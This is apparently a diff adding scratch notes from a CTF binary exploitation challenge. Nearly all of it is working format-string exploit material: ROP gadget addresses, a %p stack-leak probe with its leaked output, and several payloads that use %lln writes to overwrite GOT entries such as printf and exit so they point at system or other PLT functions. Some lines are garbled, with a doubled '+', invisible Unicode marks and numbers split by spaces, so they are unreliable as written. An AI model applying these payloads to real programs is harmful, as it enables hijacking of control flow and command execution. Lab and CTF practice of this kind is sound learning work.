@@ -1,0 +1,41 @@
+0x00000000004007e3 : pop rdi ; ret
+0x00000000004007e1 : pop rsi ; pop r15 ; ret
+
+
+e AAAAAAAAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
+
+aaaaaa%()$15n
+
+
+payload="a%"+str(system_plt-1)+"c%8$lln"+p64(printf_got)
+
+payload="aaaaaa%"+str(printf_plt-1)+"c%17$lln"+p64(exit_got)
+
+payload="aaaaaa%"+str(system_plt-1)+"c%17$lln"+p64(printf_got)
+
+
+payload="aa%15$s"++p64(printf_got)
+
+7
+
+
+‭aa%921 69369866 47285386 ‬c%17$lln
+
+
+‭aaaaaa %1398321 96774912‬c%17$lln
+
+
+0x4006a0
+
+0x4006a0: strlen@plt
+
+
+payload="e "+"aaaaaa%"+str(elf.plt["strlen"]-1)+"c%17$lln"+p64(exit_got)
+
+
+
+AAAAAAAAAAAAAA.0x7f010890a7e3.0x7f010890b8c0.0x7f010862e154.0x11.0x7f0108b2c4c0.(nil).0x7ffcfa8efc62.0x7ffcfa8f0070.0x400aa6.0x3.0x7ffcfa8efc60.0x7ffcfa8efc60.0x7ffcfa8efc62.0x4141414141410065.0x4141414141414141.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.(nil).(nil).0xffffffffffffffff.0xffffffffffffffff.0x400000004.0x400000004.0x7f010890a420.0x7f010890a420.(nil).(nil).(nil).(nil).(nil).(nil).0x7f010890a480.0x7f010890a480.0x7f010890a440.0x7f010890a440.0x7e0000007d.0x800000007f.0x7f0108909c30.0x7f0108909c30.0xe.0xe.(nil)root@ctftest:/ctf/wo
+
+
+
+6a6 6ac
